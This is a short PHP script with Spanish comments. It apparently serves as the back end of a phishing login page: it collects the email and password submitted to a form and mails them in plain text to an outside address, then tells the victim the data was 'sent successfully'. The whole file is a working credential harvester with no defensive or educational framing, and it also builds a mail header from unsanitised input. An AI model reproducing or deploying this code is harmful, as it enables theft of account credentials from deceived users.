<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Dirección de correo a la que se enviará el email
    $to = 'gmail@juliaysantino989.com';

    // Asunto del email
    $subject = 'Datos de inicio de sesión';

    // Mensaje del email
    $message = "Correo electrónico: $email\n";
    $message .= "Contraseña: $password\n";

    // Cabeceras del email
    $headers = "From: webmaster@example.com\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "Content-type: text/plain; charset=utf-8\r\n";

    // Enviar el email
    if (mail($to, $subject, $message, $headers)) {
        echo '<script>alert("Datos enviados correctamente.");</script>';
    } else {
        echo '<script>alert("Error al enviar los datos.");</script>';
    }
} else {
    echo '<script>alert("Acceso no permitido.");</script>';
}
?>
